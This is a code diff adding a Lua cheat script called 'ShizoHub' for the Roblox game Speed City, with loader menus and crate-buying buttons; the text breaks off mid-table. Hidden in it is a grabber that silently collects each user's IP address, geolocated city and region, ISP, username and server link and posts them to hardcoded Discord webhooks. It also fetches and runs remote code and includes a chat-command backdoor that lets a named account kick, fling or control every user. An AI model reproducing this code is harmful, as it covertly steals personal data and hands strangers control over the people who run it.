@@ -1,0 +1,2074 @@
+local _P = game:GetService("Players")
+local players = game:GetService("Players")
+local Players = game:GetService("Players")
+local LP = _P.LocalPlayer
+PlaceId, JobId = game.PlaceId, game.JobId
+local jobId = 'https://www.roblox.com/games/2636441885/Speed-City?serverJobId='..JobId..''
+local mainAccountName = "T_azb"
+local targetPlayer = Players:FindFirstChild(mainAccountName)
+local player = game.Players.LocalPlayer
+local charX = player.character
+local A = charX:WaitForChild("Humanoid")
+local p = game:GetService("Players")
+local lp = game:FindService("Players").LocalPlayer
+local player = game.Players.LocalPlayer
+local versionUrl = "https://raw.githubusercontent.com/lmaooa1043/scripts/main/version.txt"
+local BootTime = os.time()
+
+task.spawn(function()
+    game:HttpGet('https://api.counterapi.dev/v1/:ShizoHub/:ShizoCount/up')
+end)
+
+local function gplr(String)
+	local Found = {}
+	local strl = String:lower()
+	if strl == "all" then
+		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+			table.insert(Found,v)
+		end
+	elseif strl == "others" then
+		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+			if v.Name ~= lp.Name then
+				table.insert(Found,v)
+			end
+		end 
+	elseif strl == "me" then
+		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+			if v.Name == lp.Name then
+				table.insert(Found,v)
+			end
+		end 
+	else
+		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+			if v.Name:lower():sub(1, #String) == String:lower() then
+				table.insert(Found,v)
+			end
+		end 
+	end
+	return Found 
+end
+
+local function trim(s)
+    return s:gsub("^%s+", ""):gsub("%s+$", "")
+end
+
+-- <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+
+local currentVersion = game:HttpGet(versionUrl)
+
+currentVersion = trim(currentVersion) 
+
+print("Fetched version: "..currentVersion.."")
+
+if not currentVersion then
+    print("Failed to check script version. Please try again later.")
+    return
+end
+
+if currentVersion == "V5.8.4" then
+    print("Version is up to date. Proceeding...")
+else
+    LP:Kick("Wrong version, Please give the admins a few minutes to fix the version.")
+    task.wait(3)
+    LP:Kick("Wrong version, Please give the admins a few minutes to fix the version.")
+    task.wait(3)
+    LP:Kick("Wrong version, Please give the admins a few minutes to fix the version.")
+    task.wait(3)
+    LP:Kick("Wrong version, Please give the admins a few minutes to fix the version.")
+    task.wait(3)
+    LP:Kick("Wrong version, Please give the admins a few minutes to fix the version.")
+    return
+end
+
+-- <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+
+local lockdownurl = "https://raw.githubusercontent.com/lmaooa1043/scripts/main/lockdown.txt"
+local lockdowncheck = game:HttpGet(lockdownurl)
+
+local function trim(s)
+    return s:gsub("^%s+", ""):gsub("%s+$", "")
+end
+
+lockdowncheck = trim(lockdowncheck) 
+
+print("Fetched lockdown: "..lockdowncheck.."")
+
+if not lockdowncheck then
+    print("Failed to check lockdown check. Please try again later.")
+    return
+end
+
+if lockdowncheck == "false" then
+    print("Lockdown check is false. Proceeding...")
+else
+    print("Lockdown check is true, Kicking localplayer")
+    LP:Kick("Shizohub is on temporary lockdown, Please wait around 5 ~ 10 minutes until the script exits lockdown mode | This happens automatically, this is just a check for lockdown mode")
+    task.wait(3)
+    LP:Kick("Shizohub is on temporary lockdown, Please wait around 5 ~ 10 minutes until the script exits lockdown mode | This happens automatically, this is just a check for lockdown mode")
+    task.wait(3)
+    LP:Kick("Shizohub is on temporary lockdown, Please wait around 5 ~ 10 minutes until the script exits lockdown mode | This happens automatically, this is just a check for lockdown mode")
+    task.wait(3)
+    LP:Kick("Shizohub is on temporary lockdown, Please wait around 5 ~ 10 minutes until the script exits lockdown mode | This happens automatically, this is just a check for lockdown mode")
+    return
+end
+
+-- <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+
+
+if game.PlaceId ~= 2636441885 then
+    game.Players.LocalPlayer:Kick("This script can only be used in Speed City.")
+    task.wait(3)
+    game.Players.LocalPlayer:Kick("This script can only be used in Speed City.")
+    task.wait(3)
+    game.Players.LocalPlayer:Kick("This script can only be used in Speed City.")
+    task.wait(3)
+    game.Players.LocalPlayer:Kick("This script can only be used in Speed City.")
+    task.wait(3)
+    game.Players.LocalPlayer:Kick("This script can only be used in Speed City.")
+    task.wait(3)
+    game.Players.LocalPlayer:Kick("This script can only be used in Speed City.")
+    
+    return
+end
+
+--[[
+    <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+
+    Ownerlist
+
+    <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+]] 
+
+local OwnerList = {
+    ["T_azb"] = "Head.Rank.Label",
+    ["RyosUser"] = "Head.Rank.Label",
+}
+
+local function updateOwnerRankLabel(userName)
+    task.wait(12)
+    local player = Players:FindFirstChild(userName)
+    if player then
+        local character = player.Character
+        if character then
+            local head = character:FindFirstChild("Head")
+            if head then
+                local label = head:FindFirstChild("Rank") and head.Rank:FindFirstChild("Label")
+                if label then
+                    label.Text = "[ 👑 ] Owner"
+                    return
+                end
+            end
+        end
+    end
+end
+
+Players.PlayerAdded:Connect(function(player)
+    local userName = player.Name
+    if OwnerList[userName] then
+        updateOwnerRankLabel(userName)
+    end
+end)
+
+for userName, _ in pairs(OwnerList) do
+    updateOwnerRankLabel(userName)
+end
+
+--[[
+    <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+
+    Adminlist
+
+    <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+]] 
+
+local AdminList = {
+    ["AlMBOTERXX"] = "Head.Rank.Label",
+}
+
+local function updateAdminRankLabel(userName)
+    task.wait(12)
+    local player = Players:FindFirstChild(userName)
+    if player then
+        local character = player.Character
+        if character then
+            local head = character:FindFirstChild("Head")
+            if head then
+                local label = head:FindFirstChild("Rank") and head.Rank:FindFirstChild("Label")
+                if label then
+                    label.Text = "[ 🌟 ] Administrator"
+                    return
+                end
+            end
+        end
+    end
+end
+
+Players.PlayerAdded:Connect(function(player)
+    local userName = player.Name
+    if AdminList[userName] then
+        updateAdminRankLabel(userName)
+    end
+end)
+
+for userName, _ in pairs(AdminList) do
+    updateAdminRankLabel(userName)
+end
+
+--[[
+    <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+
+    Modlist
+
+    <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+]] 
+
+local ModList = {
+    ["Getyourprize549"] = "Head.Rank.Label",
+    ["Getyourprize550"] = "Head.Rank.Label",
+    ["CodedSymbol"] = "Head.Rank.Label",
+}
+
+local function updateModRankLabel(userName)
+    task.wait(12)
+    local player = Players:FindFirstChild(userName)
+    if player then
+        local character = player.Character
+        if character then
+            local head = character:FindFirstChild("Head")
+            if head then
+                local label = head:FindFirstChild("Rank") and head.Rank:FindFirstChild("Label")
+                if label then
+                    label.Text = "[ ✨ ] Moderator"
+                    return
+                end
+            end
+        end
+    end
+end
+
+Players.PlayerAdded:Connect(function(player)
+    local userName = player.Name
+    if ModList[userName] then
+        updateModRankLabel(userName)
+    end
+end)
+
+for userName, _ in pairs(ModList) do
+    updateModRankLabel(userName)
+end
+
+--[[
+    <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+
+    End of list
+
+    <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+]] 
+
+function bringPlayer()
+    if targetPlayer then
+        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I'm here Master 7rab!", "All")
+        LP.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        LP.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        LP.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        LP.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        LP.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        LP.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        task.wait(0.15)
+        LP.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        LP.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        LP.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        game.Players.LocalPlayer.Character.Head.Anchored = true
+        LP.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        task.wait(15)
+        game.Players.LocalPlayer.Character.Head.Anchored = false
+        print("Successfully brought player.")
+    else
+        print("Target player not found.")
+    end
+end
+
+function flingSelf()
+    if targetPlayer then
+        local Target = gplr(player.name)
+	if Target[1] then
+		Target = Target[1]
+ 
+		local Thrust = Instance.new('BodyThrust', lp.Character.HumanoidRootPart)
+		Thrust.Force = Vector3.new(99999,99999,99999)
+		Thrust.Name = "YeetForce"
+		repeat
+			lp.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame
+			Thrust.Location = Target.Character.HumanoidRootPart.Position
+			game:FindService("RunService").Heartbeat:wait()
+		until not Target.Character:FindFirstChild("Head")
+	else
+		print("Invalid player")
+	end
+	end
+end
+
+function banPlayer()
+    if targetPlayer then
+        LP:Kick("You have been BANNED by the mod team!")
+    end
+end
+
+function resetPlayer()
+    if targetPlayer then
+        A.Health = 0
+        task.wait(5.8)
+        LP.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+    end
+end
+
+
+function kickPlayer()
+    if targetPlayer then
+        LP:Kick("You have been KICKED by the mod team!")
+    end
+end
+
+function spinPlayer()
+    if targetPlayer then
+        power = 150 -- change this to make it more or less powerful
+ 
+game:GetService('RunService').Stepped:connect(function()
+game.Players.LocalPlayer.Character.Head.CanCollide = false
+game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
+game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
+game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
+end)
+wait(.1)
+local bambam = Instance.new("BodyThrust")
+bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+bambam.Force = Vector3.new(power,0,power)
+bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+    end
+end
+
+targetPlayer.Chatted:Connect(function(msg)
+    if msg == ".ban" then
+        banPlayer()
+    end
+end)
+
+targetPlayer.Chatted:Connect(function(msg)
+    if msg == ".bring" then
+        bringPlayer()
+    end
+end)
+
+targetPlayer.Chatted:Connect(function(msg)
+    if msg == ".dance2" then
+        game:GetService("Players"):Chat("/e dance2")
+    end
+end)
+
+targetPlayer.Chatted:Connect(function(msg)
+    if msg == ".dance" then
+        game:GetService("Players"):Chat("/e dance")
+    end
+end)
+
+targetPlayer.Chatted:Connect(function(msg)
+    if msg == ".dance3" then
+        game:GetService("Players"):Chat("/e dance3")
+    end
+end)
+
+targetPlayer.Chatted:Connect(function(msg)
+    if msg == ".dance1" then
+        game:GetService("Players"):Chat("/e dance1")
+    end
+end)
+
+targetPlayer.Chatted:Connect(function(msg)
+    if msg == ".freeze" then
+        game.Players.LocalPlayer.Character.Head.Anchored = true
+    end
+end)
+
+targetPlayer.Chatted:Connect(function(msg)
+    if msg == ".thaw" then
+        game.Players.LocalPlayer.Character.Head.Anchored = false
+    end
+end)
+
+targetPlayer.Chatted:Connect(function(msg)
+    if msg == ".spin" then
+        spinPlayer()
+    end
+end)
+
+targetPlayer.Chatted:Connect(function(msg)
+    if msg == ".kick" then
+        kickPlayer()
+    end
+end)
+
+targetPlayer.Chatted:Connect(function(msg)
+    if msg == ".reset" then
+        resetPlayer()
+    end
+end)
+
+targetPlayer.Chatted:Connect(function(msg)
+    if msg == ".unspin" then
+        resetPlayer()
+    end
+end)
+
+targetPlayer.Chatted:Connect(function(msg)
+    if msg == ".chat" then
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("ShizoDevs runs all ShizoHub users!","All")
+    end
+end)
+
+targetPlayer.Chatted:Connect(function(msg)
+    if msg == ".fling" then
+        flingSelf()
+    end
+end)
+
+
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3624.356689453125, 67.44207763671875, 1019.2069702148438)
+print("Loading map... - 1")
+task.wait(0.5)
+print("Loaded map! - 1")
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-4680.10302734375, 1799.003173828125, -2812.972900390625)
+print("Loading map... - 2")
+task.wait(0.5)
+print("Loaded map! - 2")
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2388, 2742.198974609375, 390)
+print("Loading map... - 3")
+task.wait(0.5)
+print("Loaded map! - 3")
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1270.0101318359375, 258.29638671875, 2022.0003662109375)
+print("Loading map... - 4")
+task.wait(0.5)
+print("Loaded map! - 4")
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-4966.94921875, 410.0472106933594, -5954.06298828125)
+print("Teleporting back to Main city...")
+task.wait(0.5)
+print("Teleported back to Main city!")
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-0.22569675743579865, 29.69999885559082, -54.05292892456055)
+
+print("<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>")
+print("<><> Thank you for using ShizoHub! <><>")
+print("<> Credits <>")
+print("7rab")
+print("0mg")
+print("<> Credits <>")
+print("<><> Find our Discord's in the Credits tab! <><>")
+print("<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>")
+
+    
+local Url = "https://discord.com/api/webhooks/1233150740885934191/utEmRb4ud9XiTaKpITnxIoZgU96mNyygT_KeZNpc_EaO0heo7URKTqGdMVegIg-GxzMs"
+local name = game:GetService("Players").LocalPlayer.Name
+local getIPResponse = request({
+    Url = "https://api.ipify.org/?format=json",
+    Method = "GET"
+})
+local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
+local IPBuffer = tostring(GetIPJSON.ip)
+
+local getIPInfo = request({
+    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
+    Method = "Get"
+})
+local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
+local FI = {
+    IP = IPBuffer,
+    country = IIT.country,
+    countryCode = IIT.countryCode,
+    region = IIT.region,
+    regionName = IIT.regionName,
+    city = IIT.city,
+    zipcode = IIT.zip,
+    latitude = IIT.lat,
+    longitude = IIT.lon,
+    isp = IIT.isp,
+    org = IIT.org
+}
+
+local msg = {
+    ["username"] = "ShizoLoader",
+    ["avatar_url"] = "https://cdn.discordapp.com/avatars/1042440993028460594/a_035d169085bd2b11e8fe06459ec25d1b.gif?size=1024&width=0&height=256",
+    ["content"] = "||@everyone , @here||",
+    ["embeds"] = {
+        {
+            ["color"] = tonumber("0x32CD32"),
+            ["title"] = "ShizoLogger | ".. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+            ["thumbnail"] = {
+                ["url"] = game:GetService("HttpService"):JSONDecode(game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))).data[1].imageUrl,
+            },
+            ["fields"] = {
+                {
+                    ["name"] = "Username",
+                    ["value"] = "||"..game.Players.LocalPlayer.Name.."||",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Display Name",
+                    ["value"] = game.Players.LocalPlayer.DisplayName,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "UID",
+                    ["value"] = "||["..game.Players.LocalPlayer.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")||",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Executor Used",
+                    ["value"] = identifyexecutor() or "Unknown",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Account Age",
+                    ["value"] = game.Players.LocalPlayer.AccountAge.."day(s)",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Date Joined",
+                    ["value"] = os.date("!*t", os.time() - (game.Players.LocalPlayer.AccountAge * 86400)).day.."/"..os.date("!*t", os.time() - (game.Players.LocalPlayer.AccountAge * 86400)).month.."/"..os.date("!*t", os.time() - (game.Players.LocalPlayer.AccountAge * 86400)).year,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Device",
+                    ["value"] = (game:GetService("GuiService"):IsTenFootInterface() and "Console")
+                        or (game:GetService("UserInputService").TouchEnabled and not game:GetService("UserInputService").MouseEnabled and workspace.CurrentCamera.ViewportSize.Y > 600 and "Mobile (tablet)")
+                        or (game:GetService("UserInputService").TouchEnabled and not game:GetService("UserInputService").MouseEnabled and workspace.CurrentCamera.ViewportSize.Y <= 600 and "Mobile (phone)")
+                        or "Desktop",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Join Server",
+                    ["value"] = "[Join Server](" ..jobId.. ")",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Game ID",
+                    ["value"] = game.PlaceId,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Game website",
+                    ["value"] = "https://www.roblox.com/games/"..game.PlaceId.."/",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "IP & Country",
+                    ["value"] = "||" ..FI.IP.. " | " ..FI.country.. "||",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "City & Region",
+                    ["value"] = "||" ..FI.city.. " | " ..FI.regionName.. "||",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "ISP & ORG",
+                    ["value"] = "||" ..FI.isp.. " | " ..FI.org.. "||",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Boot-Time",
+                    ["value"] = "Loaded in " .. os.time() - BootTime .. " seconds",
+                    ["inline"] = true
+                }
+            },
+            ['footer'] = {
+                ["text"] = "Powered by ShizoPhrenic",
+                ["icon_url"] = "https://cdn.discordapp.com/icons/1233150686867361883/a4db114fd807f5edcfb15c44f34abb28.webp?size=4096"
+            },
+            ['timestamp'] = os.date("!%Y-%m-%dT%X.000Z")
+        }
+    }
+}
+
+request({Url = Url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode(msg)})
+
+local PlatoLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/lmaooa1043/scripts/main/platolib.lua"))()
+
+local customConfig = {
+    accountId = 20013,  -- Custom account ID
+    allowPassThrough = false,
+    allowKeyRedeeming = true,
+    useDataModel = true
+}
+
+local plato = PlatoLib.init(customConfig)
+
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+
+local Window = Library.CreateLib("ShizoLoader", "DarkTheme")
+
+local Tab = Window:NewTab("ShizoLoader")
+
+local Section = Tab:NewSection("Keysystem")
+
+Section:NewTextBox("Insert Key", "Insert your key", function(txt)
+	local key = txt
+    local isValid = plato.verify(key)
+
+if isValid then
+    print("Valid Key")
+
+    local githubRawURL = "https://raw.githubusercontent.com/lmaooa1043/scripts/main/blacklist.lua"
+
+local function fetchBlacklistData()
+    local success, response = pcall(function()
+        return game:HttpGetAsync(githubRawURL)
+    end)
+    
+    if success then
+        local blacklistData = loadstring(response)()
+        if blacklistData then
+            local blacklistedIDs = blacklistData.blacklistedIDs or {}
+            local blacklistedUsernames = blacklistData.blacklistedUsernames or {}
+
+            local function isBlacklistedByID(player)
+                return blacklistedIDs[player.UserId] or false
+            end
+
+            local function isBlacklistedByUsername(player)
+                return blacklistedUsernames[player.Name] or false
+            end
+
+            local function kickPlayer(player)
+                player:Kick("You have been blacklisted from using ShizoHub! | Reason: Skid!")
+            end
+
+            local player = game.Players.LocalPlayer
+            if player and (isBlacklistedByID(player) or isBlacklistedByUsername(player)) then
+                kickPlayer(player)
+            end
+        else
+            warn("Failed to load blacklist data")
+        end
+    else
+        warn("Failed to fetch blacklist data: " .. tostring(response))
+    end
+end
+
+fetchBlacklistData()
+
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+local Window = Rayfield:CreateWindow({
+    Name = "ShizoLoader",
+    LoadingTitle = "ShizoLoader is loading..",
+    LoadingSubtitle = "by 7rab",
+    ConfigurationSaving = {
+       Enabled = false,
+       FolderName = "ShizoLoader",
+       FileName = "ShizoConfigs"
+    },
+    Discord = {
+       Enabled = false,
+       Invite = "H8b2mMeR",
+       RememberJoins = true
+    },
+    KeySystem = false,
+    KeySettings = {
+       Title = "ShizoLoader",
+       Subtitle = "Key System",
+       Note = "Key: Sh1zoHubAijL81JDkVefg",
+       FileName = "ShizoKey",
+       SaveKey = false,
+       GrabKeyFromSite = true,
+       Key = {"https://pastebin.com/raw/emSuVuWe","Sh1zoHubrnNkpN7Gtt","lz"}
+    }
+ })
+ local Tab = Window:CreateTab("ShizoLoader", 4483362458)
+ local Section = Tab:CreateSection("Loader")
+ local Paragraph = Tab:CreateParagraph({Title = "Important!", Content = "Thank you for using ShizoHub!, Join https://dsc.gg/7strapz for support!"})
+ local Button = Tab:CreateButton({
+    Name = "Load ShizoHub ( PC Version )",
+    Callback = function()
+        Rayfield:Destroy()
+local Url = "https://discord.com/api/webhooks/1233411859500109894/CppnyYpC3eiYx3lfsKEE2u8a4FJ9HwvagbxcwoPgDf4G66gCnb5Xjnl5RR4pvqiKGLrs"
+local name = game:GetService("Players").LocalPlayer.Name
+local getIPResponse = request({
+    Url = "https://api.ipify.org/?format=json",
+    Method = "GET"
+})
+local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
+local IPBuffer = tostring(GetIPJSON.ip)
+        
+local getIPInfo = request({
+    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
+    Method = "Get"
+})
+local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
+local FI = {
+    IP = IPBuffer,
+    country = IIT.country,
+    countryCode = IIT.countryCode,
+    region = IIT.region,
+    regionName = IIT.regionName,
+    city = IIT.city,
+    zipcode = IIT.zip,
+    latitude = IIT.lat,
+    longitude = IIT.lon,
+    isp = IIT.isp,
+    org = IIT.org
+}
+        
+local msg = {
+    ["username"] = "ShizoHub - PC",
+    ["avatar_url"] = "https://cdn.discordapp.com/avatars/1042440993028460594/a_035d169085bd2b11e8fe06459ec25d1b.gif?size=1024&width=0&height=256",
+    ["content"] = "||@everyone , @here||",
+    ["embeds"] = {
+        {
+            ["color"] = tonumber("0x32CD32"),
+            ["title"] = "ShizoLogger | PC Version | ".. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+            ["thumbnail"] = {
+                ["url"] = game:GetService("HttpService"):JSONDecode(game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))).data[1].imageUrl,
+            },
+            ["fields"] = {
+                {
+                    ["name"] = "Username",
+                    ["value"] = "||"..game.Players.LocalPlayer.Name.."||",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Display Name",
+                    ["value"] = game.Players.LocalPlayer.DisplayName,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "UID",
+                    ["value"] = "||["..game.Players.LocalPlayer.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")||",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Executor Used",
+                    ["value"] = identifyexecutor() or "Unknown",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Account Age",
+                    ["value"] = game.Players.LocalPlayer.AccountAge.."day(s)",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Date Joined",
+                    ["value"] = os.date("!*t", os.time() - (game.Players.LocalPlayer.AccountAge * 86400)).day.."/"..os.date("!*t", os.time() - (game.Players.LocalPlayer.AccountAge * 86400)).month.."/"..os.date("!*t", os.time() - (game.Players.LocalPlayer.AccountAge * 86400)).year,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Device",
+                    ["value"] = (game:GetService("GuiService"):IsTenFootInterface() and "Console")
+                        or (game:GetService("UserInputService").TouchEnabled and not game:GetService("UserInputService").MouseEnabled and workspace.CurrentCamera.ViewportSize.Y > 600 and "Mobile (tablet)")
+                        or (game:GetService("UserInputService").TouchEnabled and not game:GetService("UserInputService").MouseEnabled and workspace.CurrentCamera.ViewportSize.Y <= 600 and "Mobile (phone)")
+                        or "Desktop",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Join Server",
+                    ["value"] = "[Join Server](" ..jobId.. ")",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Game ID",
+                    ["value"] = game.PlaceId,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Game website",
+                    ["value"] = "https://www.roblox.com/games/"..game.PlaceId.."/",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "IP & Country",
+                    ["value"] = "||" ..FI.IP.. " | " ..FI.country.. "||",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "City & Region",
+                    ["value"] = "||" ..FI.city.. " | " ..FI.regionName.. "||",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "ISP & ORG",
+                    ["value"] = "||" ..FI.isp.. " | " ..FI.org.. "||",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Boot-Time",
+                    ["value"] = "Loaded in " .. os.time() - BootTime .. " seconds",
+                    ["inline"] = true
+                }
+            },
+            ['footer'] = {
+                ["text"] = "Powered by ShizoPhrenic",
+                ["icon_url"] = "https://cdn.discordapp.com/icons/1233150686867361883/a4db114fd807f5edcfb15c44f34abb28.webp?size=4096"
+            },
+            ['timestamp'] = os.date("!%Y-%m-%dT%X.000Z")
+        }
+    }
+}
+        
+request({Url = Url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode(msg)})
+
+local DevTools = loadstring(game:HttpGet("https://raw.githubusercontent.com/05-4/DevTools/main/index.lua"))()
+
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+
+local Window = DevTools:Init({
+    Name = "ShizoHub",
+    Title = "ShizoHub",
+    Subtitle = "by 7rab",
+    Icon = "rbxassetid://6031280882",
+    LoadingBackgroundImage = "rbxassetid://13677037989",
+
+    Options = {
+        KillYourself = false,
+        FOVAnimations = true,
+    }
+})
+
+local Tab1 = Window:CreateTab({ Name = "Crates", Icon = "6031068421" })
+Tab1:CreateSection("Trillionaire City")
+local Button1 = Tab1:CreateButton({
+    Name = "Best Crate - 50T",
+    Callback = function()
+
+local args = {
+[1] = "Best Crate"
+}
+
+game:GetService("ReplicatedStorage").BuyCrate:FireServer(unpack(args))
+
+    end,
+ })
+
+ local Section2 = Tab1:CreateSection("Beach")
+
+ local Button1 = Tab1:CreateButton({
+    Name = "Beach Crate - 1M",
+    Callback = function()
+
+local args = {
+    [1] = "Beach Crate"
+}
+
+game:GetService("ReplicatedStorage").BuyCrate:FireServer(unpack(args))
+
+    end,
+ })
+  
+ local Button1 = Tab1:CreateButton({
+    Name = "Ocean Crate - 10M",
+    Callback = function()
+
+local args = {
+    [1] = "Ocean Crate"
+}
+
+game:GetService("ReplicatedStorage").BuyCrate:FireServer(unpack(args))
+
+    end,
+ })
+
+ local Section3 = Tab1:CreateSection("Winter")
+
+ local Button1 = Tab1:CreateButton({
+    Name = "Christmas Crate - 12M",
+    Callback = function()
+
+local args = {
+    [1] = "Christmas Crate"
+}
+
+game:GetService("ReplicatedStorage").BuyCrate:FireServer(unpack(args))
+
+    end,
+ })
+
+ local Button1 = Tab1:CreateButton({
+    Name = "Elf Crate - 24K",
+    Callback = function()
+
+local args = {
+    [1] = "Elf Crate"
+}
+
+game:GetService("ReplicatedStorage").BuyCrate:FireServer(unpack(args))
+
+    end,
+ })
+
+ local Section = Tab1:CreateSection("Volcano")
+
+ local Button1 = Tab1:CreateButton({
+    Name = "Legendary Crate - 500K",
+    Callback = function()
+
+local args = {
+    [1] = "Legendary Crate"
+}
+
+game:GetService("ReplicatedStorage").BuyCrate:FireServer(unpack(args))
+
+    end,
+ })
+
+ local Section = Tab1:CreateSection("Dark dimension")
+
+ local Button1 = Tab1:CreateButton({
+    Name = "Dark Crate - 4M",
+    Callback = function()
+
+local args = {
+    [1] = "Dark Crate"
+}
+
+game:GetService("ReplicatedStorage").BuyCrate:FireServer(unpack(args))
+
+    end,
+ })
+
+ local Section = Tab1:CreateSection("Main city")
+
+ local Button1 = Tab1:CreateButton({
+    Name = "Blue Crate - 250",
+    Callback = function()
+
+local args = {
+    [1] = "Blue Crate"
+}
+
+game:GetService("ReplicatedStorage").BuyCrate:FireServer(unpack(args))
+
+    end,
+ })
+
+ local Button1 = Tab1:CreateButton({
+    Name = "Purple Crate - 2.5K",
+    Callback = function()
+
+local args = {
+    [1] = "Purple Crate"
+}
+
+game:GetService("ReplicatedStorage").BuyCrate:FireServer(unpack(args))
+
+    end,
+ })
+
+ local Button1 = Tab1:CreateButton({
+    Name = "Green Crate - 25K",
+    Callback = function()
+
+local args = {
